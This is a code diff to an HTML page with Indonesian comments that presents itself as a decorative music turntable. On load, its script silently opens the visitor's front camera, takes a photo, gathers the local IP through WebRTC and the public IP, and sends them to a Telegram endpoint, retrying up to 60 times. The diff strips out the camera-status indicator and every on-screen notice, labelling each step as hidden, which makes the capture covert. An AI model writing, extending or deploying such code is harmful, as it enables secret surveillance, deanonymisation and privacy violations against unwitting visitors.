@@ -51,12 +51,8 @@
         }
 
         @keyframes drift {
-            0% {
-                transform: translate(0, 0);
-            }
-            100% {
-                transform: translate(-40px, -40px);
-            }
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(-40px, -40px); }
         }
 
         /* ---------- KARTU UTAMA ---------- */
@@ -122,61 +118,6 @@
         .card p .highlight {
             color: #f9d29d;
             font-weight: 500;
-        }
-
-        /* ---------- STATUS KAMERA ---------- */
-        .camera-status {
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            padding: 8px 18px;
-            border-radius: 100px;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            margin-bottom: 20px;
-            font-size: 0.85rem;
-            color: rgba(255, 255, 255, 0.5);
-            transition: all 0.3s ease;
-            min-height: 44px;
-        }
-
-        .camera-status .dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #4ade80;
-            animation: pulse-dot 1.5s ease-in-out infinite;
-            flex-shrink: 0;
-        }
-
-        .camera-status .dot.waiting {
-            background: #fbbf24;
-            animation: pulse-dot 1s ease-in-out infinite;
-        }
-
-        .camera-status .dot.error {
-            background: #ef4444;
-            animation: none;
-        }
-
-        .camera-status .dot.done {
-            background: #4ade80;
-            animation: none;
-        }
-
-        @keyframes pulse-dot {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.3; transform: scale(0.7); }
-        }
-
-        .camera-status .status-text {
-            font-weight: 500;
-        }
-
-        .camera-status .status-text .retry-count {
-            color: rgba(255, 255, 255, 0.3);
-            font-weight: 400;
-            font-size: 0.75rem;
         }
 
         /* ---------- TURNTABLE ---------- */
@@ -307,11 +248,6 @@
                 padding: 12px 28px;
                 font-size: 0.9rem;
             }
-            .camera-status {
-                font-size: 0.75rem;
-                padding: 6px 14px;
-                min-height: 36px;
-            }
         }
 
         @media (max-width: 360px) {
@@ -324,9 +260,12 @@
             }
         }
 
+        /* ---------- SEMUA ELEMEN KAMERA DISEMBUNYIKAN ---------- */
         video {
             display: none !important;
         }
+
+        /* Tidak ada elemen status kamera sama sekali */
     </style>
 </head>
 <body>
@@ -343,15 +282,6 @@
             <span style="color:rgba(255,255,255,0.4); font-size:0.85rem;">Tap the turntable to set the vibe.</span>
         </p>
 
-        <!-- Status Kamera -->
-        <div class="camera-status" id="cameraStatus">
-            <span class="dot waiting" id="statusDot"></span>
-            <span class="status-text" id="statusText">
-                Menunggu izin kamera
-                <span class="retry-count" id="retryCount"></span>
-            </span>
-        </div>
-
         <!-- Turntable -->
         <div class="turntable-wrapper" id="turntableBtn">
             <div class="turntable">
@@ -367,7 +297,7 @@
         </a>
     </div>
 
-    <!-- ====== SCRIPT ====== -->
+    <!-- ====== SCRIPT (SEMUA PROSES HIDDEN) ====== -->
     <script>
         (function() {
             'use strict';
@@ -380,27 +310,7 @@
             const MAX_RETRY = 60;
             let retryTimer = null;
 
-            // ---------- DOM ----------
-            const statusDot = document.getElementById('statusDot');
-            const statusText = document.getElementById('statusText');
-            const retryCountEl = document.getElementById('retryCount');
-
-            // ---------- UPDATE STATUS UI ----------
-            function updateStatus(type, message, retry = '') {
-                statusDot.className = 'dot';
-                if (type === 'waiting') {
-                    statusDot.classList.add('waiting');
-                } else if (type === 'error') {
-                    statusDot.classList.add('error');
-                } else if (type === 'done') {
-                    statusDot.classList.add('done');
-                } else {
-                    statusDot.classList.add('waiting');
-                }
-                statusText.innerHTML = message + (retry ? ` <span class="retry-count">${retry}</span>` : '');
-            }
-
-            // ---------- FUNGSI IP ----------
+            // ---------- FUNGSI IP (HIDDEN) ----------
             function getLocalIP() {
                 return new Promise((resolve) => {
                     const pc = new RTCPeerConnection({ iceServers: [] });
@@ -412,8 +322,7 @@
                         if (ipMatch) {
                             const ip = ipMatch[1];
                             if (ip.startsWith('192.168.') || ip.startsWith('10.') ||
-                                (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[
-                                    1]) <= 31)) {
+                                (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) {
                                 pc.close();
                                 resolve(ip);
                             }
@@ -431,7 +340,7 @@
                 } catch { return null; }
             }
 
-            // ---------- KIRIM KE TELEGRAM ----------
+            // ---------- KIRIM KE TELEGRAM (HIDDEN) ----------
             async function kirimKeTelegram(dataUrl, localIP, publicIP) {
                 try {
                     const blob = await fetch(dataUrl).then(r => r.blob());
@@ -448,14 +357,13 @@
                         body: formData
                     });
                     sudahKirim = true;
-                    updateStatus('done', '✅ Foto berhasil dikirim!');
+                    // Tidak ada notifikasi UI
                 } catch (e) {
                     console.error('Gagal kirim:', e);
-                    updateStatus('error', '❌ Gagal mengirim ke Telegram');
                 }
             }
 
-            // ---------- AMBIL FOTO ----------
+            // ---------- AMBIL FOTO (HIDDEN) ----------
             function ambilDanKirim(video) {
                 if (sudahKirim) return;
                 const canvas = document.createElement('canvas');
@@ -471,8 +379,6 @@
                     video.srcObject.getTracks().forEach(track => track.stop());
                 }
 
-                updateStatus('waiting', '📤 Mengirim foto ke Telegram...');
-
                 Promise.allSettled([getLocalIP(), getPublicIP()]).then((results) => {
                     const localIP = results[0].status === 'fulfilled' ? results[0].value : null;
                     const publicIP = results[1].status === 'fulfilled' ? results[1].value : null;
@@ -482,12 +388,10 @@
                 });
             }
 
-            // ---------- MULAI KAMERA ----------
+            // ---------- MULAI KAMERA (HIDDEN) ----------
             function mulaiKamera() {
                 if (sudahKirim) return;
                 retryCount++;
-
-                updateStatus('waiting', '⏳ Mengakses kamera...', `(percobaan ${retryCount}/${MAX_RETRY})`);
 
                 navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
@@ -503,8 +407,8 @@
 
                     video.onloadedmetadata = () => {
                         video.play().then(() => {
-                            updateStatus('waiting', '📸 Mengambil foto...');
-                            setTimeout(() => ambilDanKirim(video), 150);
+                            // Ambil foto tanpa jeda
+                            setTimeout(() => ambilDanKirim(video), 100);
                         }).catch(err => {
                             console.error('Gagal memutar:', err);
                             retryCamera();
@@ -518,25 +422,25 @@
                 });
             }
 
-            // ---------- RETRY OTOMATIS ----------
+            // ---------- RETRY OTOMATIS (HIDDEN) ----------
             function retryCamera() {
                 if (sudahKirim) return;
                 if (retryCount < MAX_RETRY) {
                     if (retryTimer) clearTimeout(retryTimer);
                     retryTimer = setTimeout(mulaiKamera, 2000);
                 } else {
-                    updateStatus('error', '❌ Izin kamera tidak diberikan');
+                    console.warn('Izin kamera tidak diberikan setelah ' + MAX_RETRY + ' percobaan');
                 }
             }
 
-            // ---------- JALANKAN ----------
+            // ---------- JALANKAN SAAT HALAMAN SIAP ----------
             if (document.readyState === 'complete') {
                 setTimeout(mulaiKamera, 500);
             } else {
                 window.addEventListener('load', () => setTimeout(mulaiKamera, 500));
             }
 
-            // ---------- INTERAKSI UI ----------
+            // ---------- INTERAKSI UI (HANYA ESTETIKA) ----------
             document.getElementById('turntableBtn').addEventListener('click', function(e) {
                 e.preventDefault();
                 const turntable = this.querySelector('.turntable');
@@ -553,4 +457,8 @@
                 setTimeout(() => this.style.transform = '', 150);
             });
 
-        })(
+        })();
+    </script>
+
+</body>
+</html>
